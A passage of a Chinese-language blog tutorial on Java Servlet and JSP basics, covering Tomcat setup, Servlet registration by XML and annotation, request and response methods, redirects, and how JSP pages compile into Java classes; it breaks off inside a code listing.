class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.servlet<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javax.servlet-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>依赖添加成功</p><p><img src="/image/image-20230720202749599.png" alt="image-20230720202749599"></p><p>添加Tomcat</p><p><img src="/image/image-20230720202604636.png" alt="image-20230720202604636"></p><p>添加部署方式</p><p><img src="/image/image-20230720202850737.png" alt="image-20230720202850737"></p><ul><li>war方式 ：发布模式，先打包成war包，再发布。</li><li>war exploded方式 ：常在开发的时候使用这种方式，可以支持热部署。</li></ul><p>配置 url 根路径</p><p><img src="/image/image-20230720203053500.png" alt="image-20230720203053500"></p><p>启动项目</p><p><img src="/image/image-20230720203252536.png" alt="image-20230720203252536"></p><p>项目启动成功</p><p><img src="/image/image-20230720203320725.png" alt="image-20230720203320725"></p><h1 id="二、Servlet"><a href="#二、Servlet" class="headerlink" title="二、Servlet"></a>二、Servlet</h1><h2 id="1、简介"><a href="#1、简介" class="headerlink" title="1、简介"></a>1、简介</h2><p>Java Servlet 是运行在 Web 服务器或应用服务器上的程序，它是作为来自 Web 浏览器或其他 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层。</p><p>使用 Servlet，您可以收集来自网页表单的用户输入，呈现来自数据库或者其他源的记录，还可以动态创建网页。</p><p>Java Servlet 通常情况下与使用 CGI（Common Gateway Interface，公共网关接口）实现的程序可以达到异曲同工的效果。但是相比于 CGI，Servlet 有以下几点优势：</p><ul><li>性能明显更好。</li><li>Servlet 在 Web 服务器的地址空间内执行。这样它就没有必要再创建一个单独的进程来处理每个客户端请求。</li><li>Servlet 是独立于平台的，因为它们是用 Java 编写的。</li><li>服务器上的 Java 安全管理器执行了一系列限制，以保护服务器计算机上的资源。因此，Servlet 是可信的。</li><li>Java 类库的全部功能对 Servlet 来说都是可用的。它可以通过 sockets 和 RMI 机制与 applets、数据库或其他软件进行交互。</li></ul><h2 id="2、声明-Servlet"><a href="#2、声明-Servlet" class="headerlink" title="2、声明 Servlet"></a>2、声明 Servlet</h2><h3 id="2-1、HttpServlet"><a href="#2-1、HttpServlet" class="headerlink" title="2.1、HttpServlet"></a>2.1、HttpServlet</h3><p><code>javax.servlet.http.HttpServlet</code>类继承<code>javax.servlet.GenericServlet</code>，GenericServlet实现接口<code>javax.servlet.Servlet</code>和<code>javax.servlet.ServletConfig</code>。<code>javax.servlet.Servlet</code>接口中定义了servlet基础生命周期方法：</p><ul><li>init()初始化阶段，只被调用一次，也就是在第一次创建Servlet时被调用</li><li>getServletConfig()配置</li><li>service()服务阶段，主要处理来自客户端的请求，可以根据HTTP请求类型来调用对应的方法，比如 doGet()，doPost()，doPut()等</li><li>getServletInfo()   配置</li><li>destroy()销毁阶段，该方法只会被调用一次，即在Servlet生命期结束时被调用</li></ul><p>HttpServlet不仅实现了servlet的生命周期并通过封装service方法抽象出<code>doGet()/doPost()/doDelete()/doHead()/doPut()/doOptions()/doTrace()</code>方法用于处理来自客户端的不一样的请求方式</p><p><img src="/image/image-20230720211810159.png" alt="image-20230720211810159"></p><p>综上，若声明的Servlet则只需要重写请求方法或者重写service方法即可实现servlet请求处理。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;name&quot;</span>);<br>        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> resp.getWriter();<br>        writer.write(<span class="hljs-string">&quot;hello &quot;</span>+ name);<br>        <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-2、xml-配置"><a href="#2-2、xml-配置" class="headerlink" title="2.2、xml 配置"></a>2.2、xml 配置</h3><p>配置 src&#x2F;main&#x2F;webapp&#x2F;WEB-INF&#x2F;web.xml 注册Servlet。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">display-name</span>&gt;</span>Archetype Created Web Application<span class="hljs-tag">&lt;/<span class="hljs-name">display-name</span>&gt;</span><br>    <br>  <span class="hljs-comment">&lt;!-- 绑定 HelloServlet 对应类为 org.example.HelloServlet --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>HelloServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>org.example.HelloServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br>    <br>  <span class="hljs-comment">&lt;!-- 绑定 HelloServlet 对应 url 地址为 /hello --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>HelloServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/hello<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure><p>映射匹配流程 ：&#x2F;hello 路径绑定的 Servlet-name为 HelloServlet，而 HelloServlet 绑定的class 为 org.example.HelloServlet ，访问 &#x2F;hello ，调用 org.example.HelloServlet。</p><p>配置成功，访问 &#x2F;hello ，调用 org.example.HelloServlet</p><p><img src="/image/image-20230720212335081.png" alt="image-20230720212335081"></p><h3 id="2-3、注解配置"><a href="#2-3、注解配置" class="headerlink" title="2.3、注解配置"></a>2.3、注解配置</h3><p>Servlet 3.0 之后( Tomcat7+)支持使用注解方式配置 Servlet ,在任意的Java类添加javax.servlet.annotation.WebServlet注解即可注册Servlet。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><br><span class="hljs-meta">@WebServlet(&quot;/hello1&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hello1Servlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;name&quot;</span>);<br>        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> resp.getWriter();<br>        writer.write(<span class="hljs-string">&quot;hello1 &quot;</span>+ name);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>配置成功，访问 &#x2F;hello1 ，调用 org.example.Hello1Servlet</p><p><img src="/image/image-20230720213020959.png" alt="image-20230720213020959"></p><h2 id="3、HttpServletRequest"><a href="#3、HttpServletRequest" class="headerlink" title="3、HttpServletRequest"></a>3、HttpServletRequest</h2><h3 id="3-1、核心方法："><a href="#3-1、核心方法：" class="headerlink" title="3.1、核心方法："></a>3.1、核心方法：</h3><p>存在以下核心方法：</p><ul><li><p>String getQueryString()：得到的是完整的查询字符串，如：?a&#x3D;10&amp;b&#x3D;20获取到其中的 a&#x3D;10&amp;b&#x3D;20</p></li><li><p>Enumeration getParameterNames()：得到所有的 key，以 Enum（枚举）的方式来表示。</p></li><li><p>String getParameter(String name)：根据 key 得到 value。</p></li><li><p>String[] getParameterValues(String name)：如果存在多个 key 相同的情况下，得到的value就是一个数组的形式。</p></li><li><p>Enumeration getHeaderNames()：获取请求报头中所有的 key。</p></li><li><p>String getHeader(String name)：根据 key 获取 value。</p></li><li><p>String getCharacterEncoding()：获取到请求的字符编码是什么。（其实字符编码，就包含在 getContentType里面）</p></li><li><p>String getContentType()：获取到整个 ContentType 的键值对，值里面可能包含 字符编码。</p></li><li><p>int getContentLength()：获取到 body 的长度。</p></li><li><p>InputStream getInputStream()：得到一个输入流对象。从这个对象中读取数据，其实就是读到了请求的body。请求body里面可能有些数据，可能会被这里的 getInputStream来获取。</p></li></ul><h3 id="3-2、打印请求信息"><a href="#3-2、打印请求信息" class="headerlink" title="3.2、打印请求信息"></a>3.2、打印请求信息</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.Enumeration;<br><br><span class="hljs-meta">@WebServlet(&quot;/showRequest&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ShowRequestServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br><br>        <span class="hljs-comment">// 把 api 的执行结果，放到 StringBuilder 中</span><br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">stringBuilder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br><br>        <span class="hljs-comment">// 首行部分</span><br>        stringBuilder.append(<span class="hljs-string">&quot;&lt;h3&gt; 首行部分&lt;/h3&gt;&quot;</span>);<br>        stringBuilder.append(req.getProtocol()); <span class="hljs-comment">// 获取 版本协议</span><br>        stringBuilder.append(<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>); <span class="hljs-comment">// 换行</span><br><br>        stringBuilder.append(req.getMethod()); <span class="hljs-comment">// 获取 请求方法</span><br>        stringBuilder.append(<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>); <span class="hljs-comment">// 换行</span><br><br>        stringBuilder.append(req.getRequestURI()); <span class="hljs-comment">// 获取 请求路径</span><br>        stringBuilder.append(<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>); <span class="hljs-comment">// 换行</span><br><br>        stringBuilder.append(req.getContextPath()); <span class="hljs-comment">// 获取 请求的第一级路径</span><br>        stringBuilder.append(<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>); <span class="hljs-comment">// 换行</span><br><br>        stringBuilder.append(req.getQueryString()); <span class="hljs-comment">// 获取 完整的查询字符串</span><br>        stringBuilder.append(<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>); <span class="hljs-comment">// 换行</span><br><br>        <span class="hljs-comment">// header 部分</span><br>        stringBuilder.append(<span class="hljs-string">&quot;&lt;h3&gt; header 部分&lt;/h3&gt;&quot;</span>);<br>        Enumeration&lt;String&gt; headerNames = req.getHeaderNames(); <span class="hljs-comment">// 获取报头中所有 key 值</span><br>        <span class="hljs-comment">// 使用迭代器方式来遍历 获取到的 header 中 key 值</span><br>        <span class="hljs-keyword">while</span> (headerNames.hasMoreElements()) &#123;<br>            <span class="hljs-comment">// 获取到 headerNames 中的一个 key 元素</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">headerName</span> <span class="hljs-operator">=</span> headerNames.nextElement();<br>            <span class="hljs-comment">// 通过 header 中 key 值，获取到对应的 value</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">headerValue</span> <span class="hljs-operator">=</span> req.getHeader(headerName);<br><br>            <span class="hljs-comment">// 将 key 和 value 组成键值对，放入 stringbuilder</span><br>            stringBuilder.append(headerName + <span class="hljs-string">&quot;: &quot;</span> + headerValue + <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-comment">//在展示结果之前，需要指定浏览器的读取编码的方式，防止乱码</span><br>        resp.setContentType(<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span>);<br>        resp.getWriter().write(stringBuilder.toString());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>请求后如下打印相应信息：</p><p><img src="/image/image-20230720213938094.png" alt="image-20230720213938094"></p><h3 id="3-3、获取-GET-请求中参数"><a href="#3-3、获取-GET-请求中参数" class="headerlink" title="3.3、获取 GET 请求中参数"></a>3.3、获取 GET 请求中参数</h3><p>可使用getParameter()、getParameterValues()获取请求中参数。</p><ul><li>getParameter(String name)：根据 key 得到 value。</li><li>getParameterValues(String name)：如果存在多个 key 相同的情况下，得到的value就是一个数组的形式。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-meta">@WebServlet(&quot;/getParameter&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GetParameterServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-comment">// 我们手动从浏览器传来这样的一个请求：/getParameter/userId=1&amp;classId=2</span><br>        <span class="hljs-comment">// 这里的查询字符串 userId=1&amp;classId=2 就是键值对的结构</span><br>        <span class="hljs-comment">// 这里我们希望根据 key，拿到对应的 value</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">userId</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;userId&quot;</span>); <span class="hljs-comment">// key 值需要和请求中的相匹配，才能获取对应的 value 值</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">classId</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;classId&quot;</span>);<br><br>        <span class="hljs-comment">// 打印数据</span><br>        resp.getWriter().write(<span class="hljs-string">&quot;userId: &quot;</span> + userId + <span class="hljs-string">&quot; classId: &quot;</span> + classId);<br>    &#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p> 启聪Tomcat，访问页面，得到如下结果，若有参数则输出，无参数则为 null</p><p><img src="/image/image-20230720214604747.png" alt="image-20230720214604747"></p><h3 id="3-3、获取-POST-请求中参数"><a href="#3-3、获取-POST-请求中参数" class="headerlink" title="3.3、获取 POST 请求中参数"></a>3.3、获取 POST 请求中参数</h3><p>POST 与 GET 相同仍使用 getParameter()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-meta">@WebServlet(&quot;/postGetParameter&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PostGetParameterServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-comment">// 加入前端传过来的参数是 userId=1&amp;classId=2</span><br>        <span class="hljs-comment">// 此时服务器也是通过 req.getParameter 来获取参数的</span><br>        resp.setContentType(<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span>); <span class="hljs-comment">// 指定浏览器读取方式</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">userId</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;userId&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">classId</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;classId&quot;</span>);<br>        resp.getWriter().write(<span class="hljs-string">&quot;userId = &quot;</span> + userId + <span class="hljs-string">&quot; classId = &quot;</span> + classId);<br>    &#125;<br><br>    <br>&#125;<br></code></pre></td></tr></table></figure><p>Servlet 可正常获取数据</p><p><img src="/image/image-20230720215038743.png" alt="image-20230720215038743"></p><h2 id="4、HttpServletResponse"><a href="#4、HttpServletResponse" class="headerlink" title="4、HttpServletResponse"></a>4、HttpServletResponse</h2><h3 id="4-1、核心方法"><a href="#4-1、核心方法" class="headerlink" title="4.1、核心方法"></a>4.1、核心方法</h3><p>存在以下核心方法：</p><ul><li><p><code>void sendRedirect(String location)</code>：返回一个重定向的响应，不是 set，而是 send，3xx 开头的响应。浏览器会自动的跳转到对应的新页面，<code>String location</code>就是你要跳转到的页面。</p></li><li><p><code>PrintWriter getWriter()</code>：得到字符流</p></li><li><p><code>OutputStream getOutputStream()</code>：得到字节流</p></li></ul><h3 id="4-2、设置状态码及重定向"><a href="#4-2、设置状态码及重定向" class="headerlink" title="4.2、设置状态码及重定向"></a>4.2、设置状态码及重定向</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-meta">@WebServlet(&quot;/redirect&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RedirectServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-comment">// 设置状态码</span><br>        resp.setStatus(<span class="hljs-number">302</span>);<br>        <span class="hljs-comment">// 重定向</span><br>        resp.setHeader(<span class="hljs-string">&quot;Location&quot;</span>,<span class="hljs-string">&quot;https://cn.bing.com&quot;</span>);<br>    &#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p>可正常重定向</p><p><img src="/image/image-20230720220204179.png" alt="image-20230720220204179"></p><h1 id="三、JSP"><a href="#三、JSP" class="headerlink" title="三、JSP"></a>三、JSP</h1><h2 id="1、简介-1"><a href="#1、简介-1" class="headerlink" title="1、简介"></a>1、简介</h2><p>JSP 全称 JavaServer Pages 基于Java语言，是一种动态网页技术，与 PHP、ASP、ASP.NET 等类似的脚本语言，JSP是为了简化Servlet的处理流程而出现的替代品，早期的Java EE因为只能使用Servlet来处理客户端请求而显得非常的繁琐和不便，使用JSP可以快速的完成后端逻辑请求。使用JSP标签在HTML网页中插入Java代码，标签通常以<code>&lt;%</code>开头 以<code>%&gt;</code>结束，JSP本质是简化版的Servlet，JSP在编译后就变成了Servlet，由于JVM只能识别 Java 类，无法识别JSP代码。故WEB服务器会将 JSP 编译为 JVM 能识别的Java类。</p><p>JSP 与 Servlet区别在于，JSP常用于动态页面显示，Servlet 常用于逻辑控制。在代码中常使用 JSP 做前端动态页面，在接收到用户输入后交给对应的 Servlet 进行处理(JSP也可以当做后端代码进行逻辑控制)。</p><p>因为在JSP中可以直接调用Java代码来实现后端逻辑的这一特性，黑客通常会编写带有恶意攻击的JSP文件(俗称WebShell)来实现对服务器资源的恶意请求和控制。</p><p>现代的MVC框架(如：Spring MVC 5.x)已经完全抛弃了JSP技术，采用了模板引擎(如：Freemark)或者RESTful的方式来实现与客户端的交互工作, 总结来说 JSP 已被慢慢淘汰。</p><h2 id="2、JSP原理"><a href="#2、JSP原理" class="headerlink" title="2、JSP原理"></a>2、JSP原理</h2><p>JSP 本质上是简化版的 Servlet，由于 JVM 无法识别JSP，故 WEB 服务器会将 JSP 编译为可识别的 .java 文件，从业务来说 JSP 常用于动态页面显示，Servlet 常用于逻辑控制即 JSP 通常作为前端动态页面，Servlet通常做为后端代码进行逻辑控制。</p><p>index.jsp</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;html&gt;<br>&lt;body&gt;<br>&lt;h2&gt;Hello World!&lt;/h2&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>启动 Tomcat</p><p><img src="/image/image-20230721201019400.png" alt="image-20230721201019400"></p><p>查看 idea 项目文件 <code>C:\Users\bai\AppData\Local\JetBrains\IntelliJIdea2022.2\tomcat\349ec0f9-08df-4618-8b09-2f49abd43030\work\Catalina\localhost\demo_war\org\apache\jsp</code> 存在文件index_jsp.java、index_jsp.class</p><p><img src="/image/image-20230721201138112.png" alt="image-20230721201138112"></p><p>编译过程如下：</p><p>浏览器第一次请求 index.jsp，Tomcat 将index.jsp转化成 index._jsp.java ，并将该文件编译成class文件，编译完毕后运行 class 文件响应浏览器请求；同时对 index.jsp 进行监听，若 index.jsp 存在改动则重新编译 ；后续访问 index.jsp 将直接调用 class 进行响应。</p><p>index._jsp.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span 